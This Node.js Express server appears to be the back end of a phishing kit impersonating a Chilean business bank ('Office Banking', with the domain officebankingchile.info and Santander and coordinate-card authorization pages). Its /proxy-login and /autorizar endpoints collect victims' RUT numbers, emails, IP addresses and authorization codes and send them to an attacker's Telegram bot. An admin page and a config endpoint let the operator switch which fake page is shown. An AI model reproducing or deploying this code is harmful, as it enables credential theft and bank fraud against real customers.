const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// ✅ CORS mejorado - permite AMBOS dominios sin redirección
const corsOptions = {
  origin: function(origin, callback) {
    if (!origin || 
        origin === "https://www.officebankingchile.info" || 
        origin === "https://officebankingchile.info" ||
        origin === "http://localhost:3000" ||
        origin === "http://localhost:5000") {
      callback(null, true);
    } else {
      callback(new Error("No permitido por CORS"));
    }
  },
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
  maxAge: 86400
};

app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ✅ Middleware para logging
app.use((req, res, next) => {
  console.log(`📨 ${req.method} ${req.path} - Origin: ${req.get('origin')}`);
  next();
});

// ✅ Health check endpoint
app.get("/health", (req, res) => {
  res.json({ status: "ok", message: "Servidor funcionando correctamente" });
});

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    res.json(cfg);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Endpoint para procesar saldo directamente
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  try {
    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
    res.json(req.body);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

    if (cfg.tipoAutorizacion === "santander") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      return;
    }

    if (cfg.tipoAutorizacion === "coordenadas") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
      return;
    }

    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
      });
    }
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error("Error en autorizar:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// ✅ Endpoint para login - SIMPLIFICADO SIN PUPPETEER
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  console.log("📝 POST /proxy-login recibido - Origin:", req.get('origin'));

  try {
    // Si es correo
    if (mail) {
      console.log("📧 Procesando correo:", mail);
      if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
        const mensaje = `📧 Correo actualizado:\n${mail}\nIP: ${ip}`;
        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
        });
      }
      return res.json({ status: "ok", mensaje: "✅ Correo actualizado correctamente" });
    }

    // Si es login
    if (rut && passwd) {
      console.log("🔐 Login recibido para RUT:", rut.substring(0, 5) + "***");
      
      if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
        const ingresoMsg = `🔐 Nuevo Login en Office Banking:\nRUT: ${rut}\nIP: ${ip}\nHora: ${new Date().toLocaleString('es-CL')}`;
        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
        });
      }
      
      return res.json({ status: "ok", mensaje: "✅ Bienvenido a Office Banking" });
    }

    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
  } catch (err) {
    console.error("⚠️ Error en /proxy-login:", err);
    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
  }
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ✅ Manejo de errores 404
app.use((req, res) => {
  res.status(404).json({ error: "Ruta no encontrada" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
